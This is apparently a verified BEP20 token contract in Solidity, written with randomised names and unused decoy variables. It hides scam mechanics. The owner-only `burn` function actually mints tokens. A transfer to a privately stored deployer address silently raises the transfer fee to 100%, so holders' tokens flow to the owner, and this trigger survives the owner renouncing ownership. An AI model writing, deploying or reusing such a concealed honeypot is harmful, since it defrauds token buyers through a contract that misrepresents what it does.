/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 12:11 GMT
 */
pragma solidity >=0.4.11;
contract yuszvz {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  sSpqcU = address(0);
uint256 public  ipsnUV = 100000000000000000000;
address public owner;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  IgYTNJ = 1000000000000000000;
address public  TBSYrO = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  QZCWWf = 100000000000000000;
string public  symbol = "EhNFfu";
uint256 public  aeVLEb = 100000000000000000000000;
address public  IceDsb = address(0);
address public  HdjTDC = address(0);
uint256 public  dRVLUk = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  juVwsM = address(0);
address private  EmiMkC = address(0);
address public  mZlElM = address(0);
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  jUAcBL = 10000000000000000000000000000;
string public  name = "ihyfXR";
uint256 public  TGiJbj = 10000000000000000;
uint256 private  gKfDkF = 10000000000000;
uint256 public constant DebZxh = 9+1;
uint256 public  WHpAMX = 10000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DIkUMM");
require(to != address(0), "DIkUMM");
require(amount <= balanceOf[from], "DIkUMM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DebZxh/gKfDkF ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EmiMkC){
gKfDkF = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () public {
EmiMkC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}